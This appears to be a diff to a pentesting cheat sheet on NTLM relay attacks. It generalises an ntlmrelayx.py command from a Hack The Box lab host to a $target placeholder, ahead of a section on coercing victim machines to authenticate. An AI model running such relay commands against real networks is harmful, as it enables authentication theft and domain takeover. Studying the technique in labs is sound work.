@@ -38,7 +38,7 @@ The relay server listens for incoming NTLM authentications and relays them to th
 
 ```bash
 # replace $Protocol with winrm, smb, ldap, etc.
-ntlmrelayx.py -smb2support -t '$Protocol://dc01.nanocorp.htb'
+ntlmrelayx.py -smb2support -t '$Protocol://$target'
 ```
 
 ### 🧨 Coerce a Victim Machine to Authenticate to You
